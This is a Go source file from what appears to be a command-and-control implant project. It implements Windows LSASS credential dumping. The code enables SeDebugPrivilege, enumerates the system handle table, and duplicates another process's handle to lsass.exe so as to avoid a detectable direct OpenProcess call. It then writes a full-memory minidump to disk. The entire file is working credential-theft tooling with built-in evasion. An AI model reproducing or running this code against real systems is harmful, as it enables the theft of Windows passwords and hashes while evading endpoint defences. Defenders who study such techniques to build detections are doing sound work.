//go:build windows

package creds

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
	"github.com/mjopsec/taburtuaiC2/implant/inject"
)

// LsassDumpViaDup dumps LSASS memory by duplicating an existing open handle to
// lsass.exe found in another process — avoiding a direct OpenProcess(lsass) call.
func LsassDumpViaDup(outPath string) (string, error) {
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return "", fmt.Errorf("enable SeDebugPrivilege: %w", err)
	}

	lsassPID, err := inject.PidByName("lsass.exe")
	if err != nil {
		return "", fmt.Errorf("find lsass.exe: %w", err)
	}

	hLsass, err := dupHandleFromSystem(lsassPID)
	if err != nil {
		return "", fmt.Errorf("duplicate LSASS handle: %w", err)
	}
	defer windows.CloseHandle(hLsass)

	return miniDumpProcess(hLsass, lsassPID, outPath)
}

// ─── System handle table enumeration ─────────────────────────────────────────

type systemHandleEntry struct {
	ProcessID             uint16
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint8
	HandleAttributes      uint8
	Handle                uint16
	Object                uintptr
	GrantedAccess         uint32
}

type systemHandleTable struct {
	NumberOfHandles uint32
	_               uint32
}

var procNtQuerySystemInfo = winsyscall.ModNtdll.NewProc("NtQuerySystemInformation")

func ntSysHandles() ([]byte, error) {
	const systemHandleInformation = 16
	bufSize := uint32(512 * 1024)
	for {
		buf := make([]byte, bufSize)
		var needed uint32
		r, _, _ := procNtQuerySystemInfo.Call(
			systemHandleInformation,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(bufSize),
			uintptr(unsafe.Pointer(&needed)),
		)
		const statusInfoLengthMismatch uintptr = 0xC0000004
		if uintptr(r) == statusInfoLengthMismatch {
			bufSize = needed + 65536
			continue
		}
		if r != 0 {
			return nil, fmt.Errorf("NtQuerySystemInformation: NTSTATUS 0x%08X", uint32(r))
		}
		return buf, nil
	}
}

func dupHandleFromSystem(targetPID uint32) (windows.Handle, error) {
	buf, err := ntSysHandles()
	if err != nil {
		return 0, err
	}

	table := (*systemHandleTable)(unsafe.Pointer(&buf[0]))
	count := table.NumberOfHandles
	entriesBase := uintptr(unsafe.Pointer(&buf[0])) + 8
	entrySize := unsafe.Sizeof(systemHandleEntry{})

	selfPID := windows.GetCurrentProcessId()

	for i := uint32(0); i < count; i++ {
		e := (*systemHandleEntry)(unsafe.Pointer(entriesBase + uintptr(i)*entrySize))
		if uint32(e.ProcessID) == selfPID {
			continue
		}
		if e.GrantedAccess&0x410 == 0 {
			continue
		}

		hDonor, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, uint32(e.ProcessID))
		if err != nil {
			continue
		}

		var hDup windows.Handle
		dupErr := windows.DuplicateHandle(
			hDonor,
			windows.Handle(e.Handle),
			windows.CurrentProcess(),
			&hDup,
			windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
			false, 0,
		)
		windows.CloseHandle(hDonor)
		if dupErr != nil {
			continue
		}

		dupPID, pidErr := windows.GetProcessId(hDup)
		if pidErr != nil || dupPID != targetPID {
			windows.CloseHandle(hDup)
			continue
		}

		return hDup, nil
	}
	return 0, fmt.Errorf("no duplicatable handle for PID %d found in system table", targetPID)
}

// miniDumpProcess writes a MiniDumpWithFullMemory dump of hProcess to outPath.
func miniDumpProcess(hProcess windows.Handle, pid uint32, outPath string) (string, error) {
	f, err := os.Create(outPath)
	if err != nil {
		return "", fmt.Errorf("create %s: %w", outPath, err)
	}
	defer f.Close()

	r, _, e := winsyscall.ProcMiniDumpWriteDump.Call(
		uintptr(hProcess),
		uintptr(pid),
		uintptr(f.Fd()),
		uintptr(miniDumpWithFullMemory),
		0, 0, 0,
	)
	if r == 0 {
		os.Remove(outPath)
		return "", fmt.Errorf("MiniDumpWriteDump: %v", e)
	}
	stat, _ := f.Stat()
	return fmt.Sprintf("LSASS dump → %s (%d bytes)", outPath, stat.Size()), nil
}
